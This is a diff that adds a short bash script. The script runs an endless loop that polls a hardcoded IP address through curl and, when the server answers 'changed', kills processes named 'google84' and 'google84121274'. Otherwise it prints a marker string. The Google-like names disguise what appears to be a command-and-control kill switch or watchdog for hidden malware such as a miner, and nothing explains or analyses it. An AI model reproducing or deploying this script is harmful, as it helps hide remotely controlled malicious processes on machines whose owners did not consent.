@@ -1,0 +1,18 @@
+while true
+do
+
+string8474=$(curl -s http://154.127.52.52/googlelinux84.php | cat)
+
+if [[ $string8474 == *"changed"* ]]; then
+
+pkill -f google84
+
+pkill -f google84121274
+
+else
+
+echo "google8474"
+
+fi
+
+done
